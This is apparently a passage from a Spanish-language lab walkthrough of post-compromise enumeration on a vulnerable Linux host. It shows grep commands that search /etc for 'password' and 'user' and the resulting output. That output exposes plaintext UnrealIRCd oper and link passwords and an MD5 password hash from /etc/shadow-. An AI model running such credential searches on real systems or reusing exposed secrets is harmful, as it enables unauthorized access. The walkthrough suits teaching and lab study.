/etc/pam.d/chfn:# prompted for a password
/etc/pam.d/chsh:# prompted for a password
/etc/pam.d/login:@include common-password
/etc/pam.d/passwd:@include common-password
Binary file /etc/unreal/modules/m_pass.so matches
Binary file /etc/unreal/modules/commands.so matches
Binary file /etc/unreal/modules/m_mkpasswd.so matches
Binary file /etc/unreal/modules/m_server.so matches
Binary file /etc/unreal/modules/m_oper.so matches
Binary file /etc/unreal/modules/m_vhost.so matches
/etc/unreal/unrealircd.conf:    password "ILiKEopeRING1022";
/etc/unreal/unrealircd.conf:    password-connect "Sup3rSERViCE";
/etc/unreal/unrealircd.conf:    password-receive "Sup3rSERViCE";
/etc/unreal/unrealircd.conf:    password        LovingTheKwlHost;
/etc/unreal/doc/example.conf: * control and/or set a password. 
/etc/unreal/doc/example.conf: *    password "(password)"; (optional)
/etc/unreal/doc/example.conf:/* Passworded allow line */
/etc/unreal/doc/example.conf:   hostname       *@*.passworded.ugly.people;
/etc/unreal/doc/example.conf:   password "f00Ness";
/etc/unreal/doc/example.conf:   password "f00";
/etc/unreal/doc/example.conf: * password-connect "(pass to send)";
/etc/unreal/doc/example.conf: * password-receive "(pass we should receive)";
/etc/unreal/doc/example.conf:   password-connect "LiNk";
/etc/unreal/doc/example.conf:   password-receive "LiNk";
/etc/unreal/doc/example.conf: * This defines the passwords for /die and /restart.
/etc/unreal/doc/example.conf: *  restart                "(password for restarting)";
/etc/unreal/doc/example.conf: *  die                    "(password for die)";
/etc/unreal/doc/example.conf: *       password (password);
/etc/unreal/doc/example.conf: *        then to use this vhost, do /vhost (login) (password) in IRC
/etc/unreal/doc/example.conf:   password        moocowsrulemyworld;
/etc/unreal/doc/unreal32docs.html:  ---8.1. <a href="#secpasswords">Passwords</a><br>
/etc/unreal/doc/unreal32docs.html:      password &lt;connection-password&gt; { &lt;auth-type&gt;; };
/etc/unreal/doc/unreal32docs.html:<p><b>password</b> (optional)<br>
/etc/unreal/doc/unreal32docs.html:   Require a connect password. You can also specify an password encryption method here.
/etc/unreal/doc/unreal32docs.html:&nbsp;&nbsp;&nbsp;<b>nopasscont</b> continue matching if no password was given (so you can put clients in special classes 
/etc/unreal/doc/unreal32docs.html:if they supply a password).
/etc/unreal/doc/unreal32docs.html:      hostname *@*.passworded.ugly.people;
/etc/unreal/doc/unreal32docs.html:      password "f00Ness";
/etc/unreal/doc/unreal32docs.html:      password &lt;password&gt; { &lt;auth-type&gt;; };
/etc/unreal/doc/unreal32docs.html:  more than one oper::from::userhost. The <b>oper::password</b> is the password the user 
/etc/unreal/doc/unreal32docs.html:  must specify, oper::password:: allows you to specify an authentication method 
/etc/unreal/doc/unreal32docs.html:  for this password, valid auth-types are crypt, md5, and sha1, ripemd-160. If 
/etc/unreal/doc/unreal32docs.html:  you want to use a plain-text password leave this sub-block out.</p>
/etc/unreal/doc/unreal32docs.html:<p>Please note that BOTH the login name and password are case sensitive</p>
/etc/unreal/doc/unreal32docs.html:      password "f00";
/etc/unreal/doc/unreal32docs.html:      restart &lt;restart-password&gt; { &lt;auth-type&gt;; };
/etc/unreal/doc/unreal32docs.html:      die &lt;die-password&gt; { &lt;auth-type&gt;; };
/etc/unreal/doc/unreal32docs.html:<p>This block sets the /restart and /die passwords with drpass::restart and drpass::die 
/etc/unreal/doc/unreal32docs.html:      password &lt;password&gt; { &lt;auth-type&gt;; };
/etc/unreal/doc/unreal32docs.html:<p>The vhost block allows you to specify a login/password that can be used with 
/etc/unreal/doc/unreal32docs.html:  in the login name the user must enter and vhost::password is the password that 
/etc/unreal/doc/unreal32docs.html:  must be entered. The vhost::password:: allows you to specify the type of 
/etc/unreal/doc/unreal32docs.html:      password mypassword;
/etc/unreal/doc/unreal32docs.html:      password-connect &lt;password-to-connect-with&gt;;
/etc/unreal/doc/unreal32docs.html:      password-receive &lt;password-to-receive&gt; { &lt;auth-type&gt;; };
/etc/unreal/doc/unreal32docs.html:  <tr><td><i>*</i></td><td> cannot connect TO but will allow a server connection (with correct password) from everywhere</td></tr>
/etc/unreal/doc/unreal32docs.html:<p><b>password-connect</b><br>
/etc/unreal/doc/unreal32docs.html:  The password used for connecting to the remote server, must be plain-text.
/etc/unreal/doc/unreal32docs.html:<p><b>password-receive</b><br>
/etc/unreal/doc/unreal32docs.html:  The password used for validating incoming links, can be encrypted (valid methods 
/etc/unreal/doc/unreal32docs.html:  just use plain-text. Often this password is the same as your password-connect.
/etc/unreal/doc/unreal32docs.html:      password-connect "LiNk";
/etc/unreal/doc/unreal32docs.html:      password-receive "LiNk";
/etc/unreal/doc/unreal32docs.html:      password &lt;password&gt;; /* only for type webirc */
/etc/unreal/doc/unreal32docs.html:   <b>password</b> is the webirc password, only used for type 'webirc'.<br>
/etc/unreal/doc/unreal32docs.html:In your CGI:IRC configuration file (cgiirc.conf) you set webirc_password to a good password.<br>
/etc/unreal/doc/unreal32docs.html:Then, in your unrealircd.conf you add a cgiirc block to allow this host and password and you set
/etc/unreal/doc/unreal32docs.html:<pre>webirc_password = LpT4xqPI5</pre>
/etc/unreal/doc/unreal32docs.html:      password "LpT4xqPI5";
/etc/unreal/doc/unreal32docs.html:this method will send the IP/host to spoof as a server password, meaning you cannot
/etc/unreal/doc/unreal32docs.html:specify a server password as a CGI:IRC user. Additionally, access control is only
/etc/unreal/doc/unreal32docs.html:IP-based and does not require an extra password like the 'webirc' method. In short,
/etc/unreal/doc/unreal32docs.html:In your CGI:IRC configuration file (cgiirc.conf) you set realhost_as_password to 1.<br>
/etc/unreal/doc/unreal32docs.html:<pre>realhost_as_password = 1</pre>
/etc/unreal/doc/unreal32docs.html:    <td height="39">vhost &lt;login&gt; &lt;password&gt;</td>
/etc/unreal/doc/unreal32docs.html:    <td height="39">identify &lt;password&gt;</td>
/etc/unreal/doc/unreal32docs.html:    <td>Sends your password to the services system to identify to your nick.<br></td>
/etc/unreal/doc/unreal32docs.html:    <td height="39">identify &lt;channel&gt; &lt;password&gt;</td>
/etc/unreal/doc/unreal32docs.html:    <td>Sends your password to the services system to identify as the founder 
/etc/unreal/doc/unreal32docs.html:    <td height="39">oper &lt;userid&gt; &lt;password&gt;<br></td>
/etc/unreal/doc/unreal32docs.html:    <td height="39">restart &lt;password&gt; &lt;reason&gt;<br></td>
/etc/unreal/doc/unreal32docs.html:    <td>Restarts the IRCD Process. Password is required if drpass { } is present. 
/etc/unreal/doc/unreal32docs.html:    <td height="39">die &lt;password&gt;<br></td>
/etc/unreal/doc/unreal32docs.html:    <td>Terminates the IRCD Process. Password is required if drpass { } is present.</td>
/etc/unreal/doc/unreal32docs.html:    <td height="36">mkpasswd &lt;password&gt;<br></td>
/etc/unreal/doc/unreal32docs.html:    <td>Will encrypt a clear text password to add it to the unrealircd.conf<br></td>
/etc/unreal/doc/unreal32docs.html:<p><b><font size="+2">8.1 Passwords</font></b><a name="secpasswords"></a><br><div class="desc">
/etc/unreal/doc/unreal32docs.html:Choose good oper passwords, link passwords, etc:<br>
/etc/unreal/doc/unreal32docs.html:- DO NOT use your link/oper passwords for something else like your mail account, bot password, forums, etc...<br>
/etc/unreal/doc/unreal32docs.html:your configfile and look for passwords... In short: <i>chmod -R go-rwx /path/to/Unreal3.2</i> if you are unsure about this.<br>
/etc/unreal/doc/unreal32docs.html:You also want to use encrypted passwords wherever possible, if you compile with OpenSSL 
/etc/unreal/doc/unreal32docs.html:use <i>sha1</i> or <i>ripemd160</i> password encryption, else use <i>md5</i>. Also if 
/etc/unreal/doc/unreal32docs.html:passwords they can still be cracked relatively easily and if someone manages to get your 
/etc/unreal/doc/unreal32docs.html:like link::password-connect.
/etc/unreal/doc/unreal32docs.html:got a trojan, used an obvious password, etc etc.. Unfortunately, it's not always in your control.<br>
/etc/unreal/doc/unreal32docs.html:he can then look at ALL network traffic that passes by; watch all conversations, capture all passwords 
Binary file /etc/unreal/tmp/2CE3F887.commands.so matches
/etc/unreal/help.conf:  " Synatx:  VHOST <login> <password>";
/etc/unreal/help.conf:  " Syntax:  OPER <uid> <password>";
/etc/unreal/help.conf:  " Note: both uid and password are case sensitive";
/etc/unreal/help.conf:  "         RESTART <password>";
/etc/unreal/help.conf:  "         RESTART <password> <reason>";
/etc/unreal/help.conf:  "         DIE <password>";
/etc/unreal/help.conf:  " you can use this hash for any encrypted passwords in your configuration file:";
/etc/unreal/help.conf:  " eg: for oper::password, vhost::password, etc.";

##### 4. Buscamos en /etc/ la palabra "user" o "username".

Esto buscará cualquier línea que contenga la palabra "user" en archivos dentro de /etc/, ignorando mayúsculas y errores de permisos.

```bash
grep -ri 'user' /etc/ 2>/dev/null
```

Resultado en consola:

/etc/rc6.d/K39ufw:                $exe -N ufw${type}-user-forward || error="yes"
/etc/rc6.d/K39ufw:                $exe -A ufw${type}-before-input -j ufw${type}-user-input || error="yes"
/etc/rc6.d/K39ufw:                $exe -A ufw${type}-before-output -j ufw${type}-user-output || error="yes"
/etc/rc6.d/K39ufw:                $exe -A ufw${type}-before-forward -j ufw${type}-user-forward || error="yes"
/etc/rc6.d/K39ufw:                if ! $exe-restore -n < $USER_RULES ; then
/etc/rc6.d/K39ufw:                    log_action_cont_msg "Problem running '$USER_RULES'"
/etc/rc6.d/K39ufw:                # be in the USER_PATH file
/etc/rc6.d/K80nfs-kernel-server:            --name rpc.mountd --user 0
/etc/rc6.d/K80nfs-kernel-server:                    --name rpc.svcgssd --user 0
/etc/rc6.d/K80nfs-kernel-server:            --name nfsd --user 0 --signal 2
/etc/proftpd/proftpd.conf:# Use this to jail all users in their homes 
/etc/proftpd/proftpd.conf:# Users require a valid shell listed in /etc/shells to login.
/etc/proftpd/proftpd.conf:# Set the user and group that the server normally runs at.
/etc/proftpd/proftpd.conf:User                          proftpd
/etc/proftpd/proftpd.conf:#   User                              ftp
/etc/proftpd/proftpd.conf:#   UserAlias                 anonymous ftp
/etc/proftpd/proftpd.conf:#   # Cosmetic changes, all files belongs to ftp user
/etc/proftpd/proftpd.conf:#   DirFakeUser       on ftp
/etc/proftpd/sql.conf:#SQLConnectInfo proftpd@sql.example.com proftpd_user proftpd_password
/etc/proftpd/sql.conf:# Describes both users/groups tables
/etc/proftpd/sql.conf:#SQLUserInfo users userid passwd uid gid homedir shell
/etc/proftpd/modules.conf:# Allow only user root to load and unload modules, but allow everyone
/etc/proftpd/modules.conf:ModuleControlsACLs insmod,rmmod allow user root
/etc/proftpd/modules.conf:ModuleControlsACLs lsmod allow user *
/etc/proftpd/ldap.conf:#LDAPDoAuth on "dc=users,dc=example,dc=com"
/etc/proftpd/ldap.conf:#LDAPDoAuth on "dc=users,dc=example,dc=com"
/etc/apache2/mods-available/mime.conf:# file in a language the user can understand.
/etc/apache2/mods-available/authz_user.load:LoadModule authz_user_module /usr/lib/apache2/modules/mod_authz_user.so
/etc/apache2/mods-available/userdir.load:LoadModule userdir_module /usr/lib/apache2/modules/mod_userdir.so
/etc/apache2/mods-available/userdir.conf:<IfModule mod_userdir.c>
/etc/apache2/mods-available/userdir.conf:        UserDir public_html
/etc/apache2/mods-available/userdir.conf:        UserDir disabled root
/etc/apache2/mods-available/ssl.conf:# block. So, if available, use this one instead. Read the mod_ssl User
/etc/apache2/mods-available/usertrack.load:LoadModule usertrack_module /usr/lib/apache2/modules/mod_usertrack.so
/etc/apache2/mods-enabled/mime.conf:# file in a language the user can understand.
/etc/apache2/mods-enabled/authz_user.load:LoadModule authz_user_module /usr/lib/apache2/modules/mod_authz_user.so
/etc/apache2/envvars:export APACHE_RUN_USER=www-data
/etc/apache2/apache2.conf:User ${APACHE_RUN_USER}
/etc/apache2/apache2.conf:# Include all the user configurations:
/etc/apache2/apache2.conf:LogFormat "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\"" combined
/etc/apache2/apache2.conf:LogFormat "%{User-agent}i" agent
/etc/fonts/fonts.dtd:    Define the per-user file that holds cache font information.
/etc/fonts/fonts.dtd:    If the filename begins with '~', it is replaced with the users
/etc/fonts/fonts.dtd:    A leading '~' in a directory name is replaced with the users
/etc/fonts/fonts.dtd:    If the filename begins with '~', it is replaced with the users
/etc/fonts/conf.avail/50-user.conf:     <!-- Load per-user customization file -->
/etc/fonts/conf.d/50-user.conf: <!-- Load per-user customization file -->
/etc/apt/sources.list:## users.
/etc/sudoers:# User alias specification
/etc/sudoers:# User privilege specification
/etc/security/group.conf:# *** NOT inherently secure. If a user can create an executable that
/etc/security/group.conf:# *** user joe logs in at 7pm writes a small C-program toplay.c that
/etc/security/group.conf:#       services;ttys;users;times;groups
/etc/security/group.conf:# the combination of individual users/terminals etc is a logic list
/etc/security/group.conf:# users
/etc/security/group.conf:#       is a logic list of users or a netgroup of users to whom this
/etc/security/group.conf:#       user. The format here is a logic list of day/time-range
/etc/security/group.conf:#      The (comma or space separated) list of groups that the user
/etc/security/group.conf:#      fields are satisfied by the user's request
/etc/security/group.conf:# For a rule to be active, ALL of service+ttys+users must be satisfied
/etc/security/group.conf:# the user 'us' is given access to the floppy (through membership of
/etc/security/group.conf:# the user 'sword' is given access to games (through membership of
/etc/security/group.conf:# high-score files and so on, so don't ever give users access to it.)
/etc/security/access.conf:# matches the (user, host) combination, or, in case of non-networked
/etc/security/access.conf:# logins, the first entry that matches the (user, tty) combination.  The
/etc/security/access.conf:#     permission : users : origins
/etc/security/access.conf:# names, or ALL (always matches). A pattern of the form user@host is
/etc/security/access.conf:# matched when the login name matches the "user" part, and when the
/etc/security/access.conf:# You can use @netgroupname in host or user patterns; this even works
/etc/security/access.conf:# for @usergroup@@hostgroup patterns.
/etc/security/access.conf:# logged-in user. Both the user's primary group is matched, as well as
/etc/security/access.conf:# groups in which users are explicitly listed.
/etc/security/access.conf:# User "root" should be allowed to get access via cron .. tty5 tty6.
/etc/security/access.conf:# User "root" should be allowed to get access from hosts with ip addresses.
/etc/security/access.conf:# User "root" should get access from network 192.168.201.
/etc/security/access.conf:# User "root" should be able to have access from domain.
/etc/security/access.conf:# User "root" should be denied to get access from all other sources. 
/etc/security/access.conf:# User "foo" and members of netgroup "nis_group" should be
/etc/security/access.conf:# User "john" should get access from ipv4 net/mask
/etc/security/access.conf:# User "john" should get access from ipv4 as ipv6 net/mask
/etc/security/access.conf:# User "john" should get access from ipv6 host address
/etc/security/access.conf:# User "john" should get access from ipv6 host address (same as above)
/etc/security/access.conf:# User "john" should get access from ipv6 net/mask
/etc/security/access.conf:# All other users should be denied to get access from all sources.
/etc/security/time.conf:#       services;ttys;users;times
/etc/security/time.conf:# the combination of individual users/terminals etc is a logic list
/etc/security/time.conf:# users
/etc/security/time.conf:#       is a logic list of users or a netgroup of users to whom this
/etc/security/time.conf:# for a rule to be active, ALL of service+ttys+users must be satisfied
/etc/security/time.conf:# the users 'you' and 'me' are denied service all of the time
/etc/security/time.conf:# Another silly example, user 'root' is denied xsh access
/etc/security/namespace.conf:# /tmp, /var/tmp and user's home directories. /tmp and /var/tmp will
/etc/security/namespace.conf:# be polyinstantiated based on both security context as well as user
/etc/security/namespace.conf:# user root and adm for directories /tmp and /var/tmp, whereas home
/etc/security/namespace.conf:# directories will be polyinstantiated for all users. The user name
/etc/security/namespace.conf:# and users home directories will reside within the directories that
/etc/security/namespace.conf:#$HOME    $HOME/$USER.inst/inst- context
/etc/security/limits.conf:#Each line describes a limit for a user in the form:
/etc/security/limits.conf:#        - an user name
/etc/security/limits.conf:#        - maxlogins - max number of logins for this user
/etc/security/limits.conf:#        - priority - the priority to run user process with
/etc/security/limits.conf:#        - locks - max number of file locks the user can hold
/etc/event.d/rc3:# This task runs the old sysv-rc runlevel 3 (user defined) scripts.  It
/etc/event.d/rc2:# This task runs the old sysv-rc runlevel 2 ("multi-user") scripts.  It
/etc/event.d/rcS-sulogin:# rcS-sulogin - "single-user" runlevel compatibility
/etc/event.d/rcS-sulogin:# This task runs the sulogin binary during "single-user" mode.
/etc/event.d/rc4:# This task runs the old sysv-rc runlevel 4 (user defined) scripts.  It
/etc/event.d/rc5:# This task runs the old sysv-rc runlevel 5 (user defined) scripts.  It
/etc/event.d/rc1:# This task runs the old sysv-rc runlevel 1 ("single-user") scripts. 
/etc/firefox-3.0/profile/chrome/userChrome-example.css: * Edit this file and copy it as userChrome.css into your
/etc/firefox-3.0/profile/chrome/userChrome-example.css: * This file can be used to customize the look of Mozilla's user interface
/etc/firefox-3.0/profile/chrome/userContent-example.css: * Edit this file and copy it as userContent.css into your
/etc/firefox-3.0/profile/prefs.js:# Mozilla User Preferences
/etc/shadow-:user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:14699:0:99999:7:::
/etc/rc.local:# This script is executed at the end of each multiuser runlevel.
/etc/rc.local:HOME=/root LOGNAME=root USER=root nohup /usr/bin/vncserver :0 >/root/vnc.log 2>&1 &
/etc/hdparm.conf:# --user-master Select password to use
/etc/hdparm.conf:# user-master = u
/etc/ftpusers:# /etc/ftpusers: list of users disallowed FTP access. See ftpusers(5).
/etc/rc0.d/K20distcc:   distccd --daemon --user daemon --allow 0.0.0.0/0
/etc/rc0.d/K21mysql:# as many admins e.g. only store a password without a username there and
/etc/rc0.d/K21mysql:    # users home and not /root)
/etc/rc0.d/K25hwclock.sh:#                 users notice something IS changing their clocks
/etc/rc0.d/K25hwclock.sh:#               - Added comments to alert users of hwclock issues
/etc/rc0.d/K22mysql-ndb:                --user mysql
/etc/rc0.d/K22mysql-ndb:                --user mysql \
/etc/rc0.d/K23mysql-ndb-mgm:            --user mysql \
/etc/rc0.d/K10tomcat5.5:# Run Tomcat 5 as this user ID
/etc/rc0.d/K10tomcat5.5:TOMCAT5_USER=tomcat55
/etc/rc0.d/K10tomcat5.5:[ -z "$TOMCAT5_USER" ] && TOMCAT5_USER=tomcat55
/etc/rc0.d/K10tomcat5.5:                --user $TOMCAT5_USER --startas "$JAVA_HOME/bin/java" \
/etc/rc0.d/K10tomcat5.5:                if [ -e "$CATALINA_BASE/conf/tomcat-users.xml" ]; then
/etc/rc0.d/K10tomcat5.5:                                "$CATALINA_BASE/conf/tomcat-users.xml"'
/etc/rc0.d/K10tomcat5.5:                eval chown --dereference "$TOMCAT5_USER" $REQUIRED_FILES \
/etc/rc0.d/K10tomcat5.5:                $DAEMON -user "$TOMCAT5_USER" -cp "$JSVC_CLASSPATH" \
/etc/rc0.d/K10tomcat5.5:                --user "$TOMCAT5_USER" --startas "$JAVA_HOME/bin/java" \
/etc/rc0.d/K10tomcat5.5:                --user $TOMCAT5_USER --startas "$JAVA_HOME/bin/java" \
/etc/rc0.d/K10tomcat5.5:                --user $TOMCAT5_USER --startas "$JAVA_HOME/bin/java" \
/etc/rc0.d/K10tomcat5.5:                --user $TOMCAT5_USER --startas "$JAVA_HOME/bin/java" \
/etc/rc0.d/K39ufw:USER_PATH="/var/lib/ufw"
/etc/rc0.d/K39ufw:    if iptables -L ufw-user-input -n >/dev/null 2>&1 ; then
/etc/rc0.d/K39ufw:            USER_RULES="$USER_PATH/user${type}.rules"
/etc/rc0.d/K39ufw:            # setup ufw${type}-user chain
/etc/rc0.d/K39ufw:            if [ -s "$USER_PATH" ]; then
/etc/rc0.d/K39ufw:                $exe -N ufw${type}-user-input || error="yes"
/etc/rc0.d/K39ufw:                $exe -N ufw${type}-user-output || error="yes"
/etc/rc0.d/K39ufw:                $exe -N ufw${type}-user-forward || error="yes"
/etc/rc0.d/K39ufw:                $exe -A ufw${type}-before-input -j ufw${type}-user-input || error="yes"
/etc/rc0.d/K39ufw:                $exe -A ufw${type}-before-output -j ufw${type}-user-output || error="yes"
/etc/rc0.d/K39ufw:                $exe -A ufw${type}-before-forward -j ufw${type}-user-forward || error="yes"
/etc/rc0.d/K39ufw:                if ! $exe-restore -n < $USER_RULES ; then
/etc/rc0.d/K39ufw:                    log_action_cont_msg "Problem running '$USER_RULES'"
/etc/rc0.d/K39ufw:                # be in the USER_PATH file
/etc/rc0.d/K80nfs-kernel-server:            --name rpc.mountd --user 0
/etc/rc0.d/K80nfs-kernel-server:                    --name rpc.svcgssd --user 0
/etc/rc0.d/K80nfs-kernel-server:            --name nfsd --user 0 --signal 2
/etc/devscripts.conf:# Variables defined here may be overridden by a per-user ~/.devscripts
/etc/devscripts.conf:# options may be used to specify the username and password to use.
/etc/devscripts.conf:# If only a username is provided then the password will be prompted for
/etc/devscripts.conf:# BTS_SMTP_AUTH_USERNAME=user
/etc/devscripts.conf:# DEBUILD_SIGNING_USERNAME="user@host"
/etc/devscripts.conf:# What user agent string should we send with requests?
/etc/devscripts.conf:# USCAN_USER_AGENT=''
/etc/mailcap:#  Users can add their own rules if they wish by creating a ".mailcap"
/etc/mailcap:#  User section follows:  Any entries included in this section will take
/etc/mailcap:#  "User Section Begins" and "User Section Ends" lines, or anything outside
/etc/mailcap:# ----- User Section Begins ----- #
/etc/mailcap:# -----  User Section Ends  ----- #
/etc/rc2.d/S11klogd:    # shovel /proc/kmsg to pipe readable by klogd user
/etc/rc2.d/S10sysklogd:# user to run syslogd as - this can overriden in /etc/default/syslogd
/etc/rc2.d/S10sysklogd:USER="syslog"
/etc/rc2.d/S10sysklogd:# Figure out under which user syslogd should be running as
/etc/rc2.d/S10sysklogd: # A specific user has been set on the command line, try to extract it.
/etc/rc2.d/S10sysklogd: USER=$(echo ${SYSLOGD} | sed -e 's/^.*-u[[:space:]]*\([[:alnum:]]*\)[[:space:]]*.*$/\1/')
/etc/rc2.d/S10sysklogd: # By default, run syslogd under the syslog user
/etc/rc2.d/S10sysklogd: SYSLOGD="${SYSLOGD} -u ${USER}"
/etc/rc2.d/S10sysklogd:# Unable to get the user under which syslogd should be running, stop.
/etc/rc2.d/S10sysklogd:if [ -z "${USER}" ]
/etc/rc2.d/S10sysklogd: log_failure_msg "Unable to get syslog user"
/etc/rc2.d/S10sysklogd:    chown ${USER}:adm /dev/xconsole
/etc/rc2.d/S10sysklogd:         chown ${USER}:adm $l
/etc/rc2.d/S20distcc:   distccd --daemon --user daemon --allow 0.0.0.0/0
/etc/rc2.d/S18mysql-ndb:                --user mysql
/etc/rc2.d/S18mysql-ndb:                --user mysql \
/etc/rc2.d/S17mysql-ndb-mgm:            --user mysql \
/etc/rc2.d/S89cron:# Description:       cron is a standard UNIX program that runs user-specified 
/etc/rc2.d/S19mysql:# as many admins e.g. only store a password without a username there and
/etc/rc2.d/S19mysql:    # users home and not /root)
/etc/rc2.d/S90tomcat5.5:# Run Tomcat 5 as this user ID
/etc/rc2.d/S90tomcat5.5:TOMCAT5_USER=tomcat55
/etc/rc2.d/S90tomcat5.5:[ -z "$TOMCAT5_USER" ] && TOMCAT5_USER=tomcat55
/etc/rc2.d/S90tomcat5.5:                --user $TOMCAT5_USER --startas "$JAVA_HOME/bin/java" \
/etc/rc2.d/S90tomcat5.5:                if [ -e "$CATALINA_BASE/conf/tomcat-users.xml" ]; then
/etc/rc2.d/S90tomcat5.5:                                "$CATALINA_BASE/conf/tomcat-users.xml"'
/etc/rc2.d/S90tomcat5.5:                eval chown --dereference "$TOMCAT5_USER" $REQUIRED_FILES \
/etc/rc2.d/S90tomcat5.5:                $DAEMON -user "$TOMCAT5_USER" -cp "$JSVC_CLASSPATH" \
/etc/rc2.d/S90tomcat5.5:                --user "$TOMCAT5_USER" --startas "$JAVA_HOME/bin/java" \
/etc/rc2.d/S90tomcat5.5:                --user $TOMCAT5_USER --startas "$JAVA_HOME/bin/java" \
/etc/rc2.d/S90tomcat5.5:                --user $TOMCAT5_USER --startas "$JAVA_HOME/bin/java" \
/etc/rc2.d/S90tomcat5.5:                --user $TOMCAT5_USER --startas "$JAVA_HOME/bin/java" \
/etc/rc2.d/S20nfs-kernel-server:            --name rpc.mountd --user 0
/etc/rc2.d/S20nfs-kernel-server:                    --name rpc.svcgssd --user 0
/etc/rc2.d/S20nfs-kernel-server:            --name nfsd --user 0 --signal 2
/etc/syslog.conf:user.*                         -/var/log/user.log
/etc/mime.types:#  Users can add their own types if they wish by creating a ".mime.types"
/etc/ssl/openssl.cnf:# requires this to avoid interpreting an end user certificate as a CA.
/etc/ssl/openssl.cnf:# requires this to avoid interpreting an end user certificate as a CA.
/etc/logrotate.d/mysql-server:            # Really no mysqld or rather a missing debian-sys-maint user?
/etc/postgresql/8.3/main/pg_ident.conf:# ident user names (typically Unix user names) to their corresponding
/etc/postgresql/8.3/main/pg_ident.conf:# PostgreSQL user names.  Records are of the form:
/etc/postgresql/8.3/main/pg_ident.conf:# MAPNAME  IDENT-USERNAME  PG-USERNAME
/etc/postgresql/8.3/main/pg_ident.conf:# pg_hba.conf.  IDENT-USERNAME is the detected user name of the
/etc/postgresql/8.3/main/pg_ident.conf:# client.  PG-USERNAME is the requested PostgreSQL user name.  The
/etc/postgresql/8.3/main/pg_ident.conf:# existence of a record specifies that IDENT-USERNAME may connect as
/etc/postgresql/8.3/main/pg_ident.conf:# PG-USERNAME.  Multiple maps may be specified in this file and used
/etc/postgresql/8.3/main/pg_ident.conf:# user names and PostgreSQL user names are the same, you don't need
/etc/postgresql/8.3/main/pg_ident.conf:# this file.  Instead, use the special map name "sameuser" in
/etc/postgresql/8.3/main/pg_ident.conf:# MAPNAME     IDENT-USERNAME    PG-USERNAME
/etc/postgresql/8.3/main/postgresql.conf:#superuser_reserved_connections = 3    # (change requires restart)
/etc/postgresql/8.3/main/postgresql.conf:#db_user_namespace = off
/etc/postgresql/8.3/main/postgresql.conf:#krb_caseins_users = off               # (change requires restart)
/etc/postgresql/8.3/main/postgresql.conf:                                       #   %u = user name
/etc/postgresql/8.3/main/postgresql.conf:#search_path = '"$user",public'                # schema names
/etc/postgresql/8.3/main/pg_hba.conf:# are authenticated, which PostgreSQL user names they can use, which
/etc/postgresql/8.3/main/pg_hba.conf:# local      DATABASE  USER  METHOD  [OPTION]
/etc/postgresql/8.3/main/pg_hba.conf:# host       DATABASE  USER  CIDR-ADDRESS  METHOD  [OPTION]
/etc/postgresql/8.3/main/pg_hba.conf:# hostssl    DATABASE  USER  CIDR-ADDRESS  METHOD  [OPTION]
/etc/postgresql/8.3/main/pg_hba.conf:# hostnossl  DATABASE  USER  CIDR-ADDRESS  METHOD  [OPTION]
/etc/postgresql/8.3/main/pg_hba.conf:# DATABASE can be "all", "sameuser", "samerole", a database name, or
/etc/postgresql/8.3/main/pg_hba.conf:# USER can be "all", a user name, a group name prefixed with "+", or
/etc/postgresql/8.3/main/pg_hba.conf:# a comma-separated list thereof.  In both the DATABASE and USER fields
/etc/postgresql/8.3/main/pg_hba.conf:# Database and user names containing spaces, commas, quotes and other special
/etc/postgresql/8.3/main/pg_hba.conf:# characters must be quoted. Quoting one of the keywords "all", "sameuser" or
/etc/postgresql/8.3/main/pg_hba.conf:# database or username with that name.
/etc/postgresql/8.3/main/pg_hba.conf:# super user can access the database using some other method.
/etc/postgresql/8.3/main/pg_hba.conf:local   all         postgres                          ident sameuser
/etc/postgresql/8.3/main/pg_hba.conf:# TYPE  DATABASE    USER        CIDR-ADDRESS          METHOD
/etc/postgresql/8.3/main/pg_hba.conf:local   all         all                               ident sameuser
/etc/idmapd.conf:Nobody-User = nobody
/etc/deluser.conf:# /etc/deluser.conf: `deluser' configuration.
/etc/deluser.conf:# Remove home directory and mail spool when user is removed
/etc/deluser.conf:# Remove all files on the system owned by the user to be removed
/etc/deluser.conf:# delete a group even there are still users in this group
/etc/deluser.conf:# exclude these filesystem types when searching for files of a user to backup
/etc/default/useradd:# Default values for useradd(8)
/etc/default/useradd:# Similar to DHSELL in adduser. However, we use "sh" here because
/etc/default/useradd:# useradd is a low level utility and should be as general
/etc/default/useradd:# The default group for users
/etc/default/useradd:# 100=users on Debian systems
/etc/default/useradd:# Same as USERS_GID in adduser
/etc/default/useradd:# primary user group with the same name as the user being added to the
/etc/default/useradd:# The default home directory. Same as DHOME for adduser
/etc/default/useradd:# The SKEL variable specifies the directory containing "skeletal" user
/etc/default/useradd:# copied to the new user's home directory when it is created.
/etc/default/tomcat5.5:# Run Tomcat as this user ID. Not setting this or leaving it blank will use the
/etc/default/tomcat5.5:#TOMCAT5_USER=tomcat55
/etc/X11/app-defaults/XTerm-color:! Some users object to this choice because the background (color4) is brighter
/etc/X11/app-defaults/XSm:         restore the state as seen by the user.\n\
/etc/X11/app-defaults/XSm:         The save should not affect data seen by other users.\n\
/etc/X11/app-defaults/XSm:         storage and also save state local to the user.\n\
/etc/X11/app-defaults/XSm:None   - Don't allow user interaction\n\
/etc/X11/app-defaults/XSm:Errors - Allow user interaction only if an error occurs\n\
/etc/X11/app-defaults/XSm:Any    - Allow user interaction for any reason\n\
Binary file /etc/X11/X matches
/etc/X11/Xwrapper.config:allowed_users=console
/etc/X11/Xsession.options:allow-user-resources
/etc/X11/Xsession.options:allow-user-xsession
/etc/X11/Xsession.d/40x11-common_xsessionrc:#Source user defined xsessionrc (locales and other environment variables)
/etc/X11/Xsession.d/40x11-common_xsessionrc:if [ -r "$USERXSESSIONRC" ]; then
/etc/X11/Xsession.d/40x11-common_xsessionrc:  . "$USERXSESSIONRC"
/etc/X11/Xsession.d/30x11-common_xresources:# Then merge the user's X resources, if the options file is so configured.
/etc/X11/Xsession.d/30x11-common_xresources:  if grep -qs ^allow-user-resources "$OPTIONFILE"; then
/etc/X11/Xsession.d/50x11-common_determine-startup:# executable, fall back to looking for a user's custom X session script, if
/etc/X11/Xsession.d/50x11-common_determine-startup:  if grep -qs ^allow-user-xsession "$OPTIONFILE"; then
/etc/X11/Xsession.d/50x11-common_determine-startup:    for STARTUPFILE in "$USERXSESSION" "$ALTUSERXSESSION"; do
/etc/X11/Xsession.d/50x11-common_determine-startup:  if grep -qs ^allow-user-xsession "$OPTIONFILE"; then
/etc/X11/Xsession.d/50x11-common_determine-startup:    ERRMSG="$ERRMSG no \"$USERXSESSION\" file, no \"$ALTUSERXSESSION\" file,"
